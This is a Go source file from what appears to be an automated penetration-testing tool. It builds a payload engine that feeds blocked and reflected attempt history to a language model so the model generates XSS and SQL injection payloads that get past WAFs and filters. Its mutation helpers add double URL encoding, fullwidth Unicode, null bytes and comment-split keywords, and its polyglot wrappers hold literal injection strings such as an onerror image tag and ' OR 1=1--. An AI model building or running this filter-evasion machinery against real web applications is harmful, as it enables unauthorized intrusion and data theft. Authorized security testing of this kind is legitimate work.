package agent

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"
	"sync"

	"github.com/bb-agent/mirage/internal/llm"
	"github.com/bb-agent/mirage/internal/models"
)

// PayloadMutationStrategy defines how payloads are mutated.
type PayloadMutationStrategy string

const (
	MutationEncode    PayloadMutationStrategy = "encode"
	MutationObfuscate PayloadMutationStrategy = "obfuscate"
	MutationPolyglot  PayloadMutationStrategy = "polyglot"
	MutationSplit     PayloadMutationStrategy = "split"
	MutationCase      PayloadMutationStrategy = "case_variation"
	MutationContext   PayloadMutationStrategy = "context_specific"
)

// PayloadAttempt records a single payload attempt and its result.
type PayloadAttempt struct {
	Payload    string `json:"payload"`
	Strategy   string `json:"strategy"`
	StatusCode int    `json:"status_code,omitempty"`
	Blocked    bool   `json:"blocked"`
	Reflected  bool   `json:"reflected"`
	Executed   bool   `json:"executed"`
	Response   string `json:"response_snippet,omitempty"`
}

// PayloadEngine handles feedback-driven payload generation and mutation.
type PayloadEngine struct {
	llmProvider llm.Provider
	mu          sync.RWMutex
	history     map[string][]PayloadAttempt // keyed by target+param
}

// NewPayloadEngine creates a new payload engine.
func NewPayloadEngine(provider llm.Provider) *PayloadEngine {
	return &PayloadEngine{
		llmProvider: provider,
		history:     make(map[string][]PayloadAttempt),
	}
}

// RecordAttempt records the result of a payload attempt for learning.
func (pe *PayloadEngine) RecordAttempt(target, param string, attempt PayloadAttempt) {
	pe.mu.Lock()
	defer pe.mu.Unlock()
	key := target + "|" + param
	pe.history[key] = append(pe.history[key], attempt)
}

// GenerateNextPayloads uses past attempt feedback to generate improved payloads.
func (pe *PayloadEngine) GenerateNextPayloads(ctx context.Context, target, param, vulnType string, techStack *TechStack) ([]string, error) {
	pe.mu.RLock()
	key := target + "|" + param
	history := pe.history[key]
	pe.mu.RUnlock()

	historyJSON, _ := json.Marshal(history)

	prompt := fmt.Sprintf(`You are an expert payload engineer for penetration testing.

TARGET: %s
PARAMETER: %s
VULNERABILITY TYPE: %s
TECH STACK: %s

PREVIOUS ATTEMPTS (learn from these):
%s

Based on the attempt history:
- Payloads that were BLOCKED suggest WAF/filter rules to bypass
- Payloads that were REFLECTED but not EXECUTED suggest context-specific encoding needed
- Payloads that got through but weren't executed suggest wrong context (attribute vs tag vs JS)

Generate 5 improved payloads that bypass the observed defenses.
For each payload, include the mutation strategy used.

Respond with JSON:
{
  "payloads": [
    {"payload": "the payload", "strategy": "why this works", "encoding": "technique used"}
  ]
}

Payload engineering techniques to consider:
- Double URL encoding
- Unicode normalization bypass (fullwidth chars, combining chars)
- HTML entity encoding (decimal, hex, named)
- Case variation and null byte insertion
- Polyglot payloads that work in multiple contexts
- Template literal injection for modern JS frameworks
- Mutation XSS via DOM clobbering
- SQL comment insertion for SQLi filter bypass
- Nested encoding (URL inside HTML inside JS)`,
		target, param, vulnType, formatTechStack(techStack), string(historyJSON))

	resp, err := pe.llmProvider.Complete(ctx, llm.CompletionRequest{
		Messages: []models.ChatMessage{
			{Role: "system", Content: "You are a payload engineering expert. Generate bypass payloads. Return only valid JSON."},
			{Role: "user", Content: prompt},
		},
		Temperature: 0.4,
	})
	if err != nil {
		return nil, fmt.Errorf("payload generation failed: %w", err)
	}

	var result struct {
		Payloads []struct {
			Payload  string `json:"payload"`
			Strategy string `json:"strategy"`
		} `json:"payloads"`
	}
	content := extractJSON(resp.Content)
	if err := json.Unmarshal([]byte(content), &result); err != nil {
		return nil, fmt.Errorf("failed to parse payloads: %w", err)
	}

	var payloads []string
	for _, p := range result.Payloads {
		payloads = append(payloads, p.Payload)
	}
	return payloads, nil
}

// MutatePayload applies a specific mutation strategy to a payload.
func (pe *PayloadEngine) MutatePayload(payload string, strategy PayloadMutationStrategy) []string {
	var mutations []string

	switch strategy {
	case MutationEncode:
		mutations = append(mutations,
			doubleURLEncode(payload),
			htmlEntityEncode(payload),
			unicodeEncode(payload),
		)
	case MutationCase:
		mutations = append(mutations,
			alternateCase(payload),
			strings.ToUpper(payload),
		)
	case MutationObfuscate:
		mutations = append(mutations,
			insertNullBytes(payload),
			insertComments(payload),
		)
	case MutationPolyglot:
		mutations = append(mutations,
			wrapPolyglot(payload, "js"),
			wrapPolyglot(payload, "html"),
			wrapPolyglot(payload, "sql"),
		)
	default:
		mutations = append(mutations, payload)
	}

	return mutations
}

// GetAttemptHistory returns the attempt history for a target/param pair.
func (pe *PayloadEngine) GetAttemptHistory(target, param string) []PayloadAttempt {
	pe.mu.RLock()
	defer pe.mu.RUnlock()
	key := target + "|" + param
	return pe.history[key]
}

// ============ Encoding helpers ============

func doubleURLEncode(s string) string {
	var b strings.Builder
	for _, c := range s {
		encoded := fmt.Sprintf("%%%02X", c)
		for _, e := range encoded {
			b.WriteString(fmt.Sprintf("%%%02X", e))
		}
	}
	return b.String()
}

func htmlEntityEncode(s string) string {
	var b strings.Builder
	for _, c := range s {
		b.WriteString(fmt.Sprintf("&#x%X;", c))
	}
	return b.String()
}

func unicodeEncode(s string) string {
	var b strings.Builder
	for _, c := range s {
		if c < 128 {
			// Use fullwidth Unicode equivalents for ASCII
			b.WriteRune(rune(c) + 0xFEE0)
		} else {
			b.WriteRune(c)
		}
	}
	return b.String()
}

func alternateCase(s string) string {
	var b strings.Builder
	for i, c := range s {
		if i%2 == 0 {
			b.WriteString(strings.ToUpper(string(c)))
		} else {
			b.WriteString(strings.ToLower(string(c)))
		}
	}
	return b.String()
}

func insertNullBytes(s string) string {
	var b strings.Builder
	for i, c := range s {
		b.WriteRune(c)
		if i%3 == 0 && c != ' ' {
			b.WriteString("%00")
		}
	}
	return b.String()
}

func insertComments(s string) string {
	s = strings.ReplaceAll(s, "SELECT", "SEL/**/ECT")
	s = strings.ReplaceAll(s, "UNION", "UN/**/ION")
	s = strings.ReplaceAll(s, "script", "scr/**/ipt")
	return s
}

func wrapPolyglot(payload, context string) string {
	switch context {
	case "js":
		return fmt.Sprintf(`'-alert(1)-'%s'-alert(1)-'`, payload)
	case "html":
		return fmt.Sprintf(`"><img src=x onerror=%s>`, payload)
	case "sql":
		return fmt.Sprintf(`' OR 1=1--%s`, payload)
	default:
		return payload
	}
}
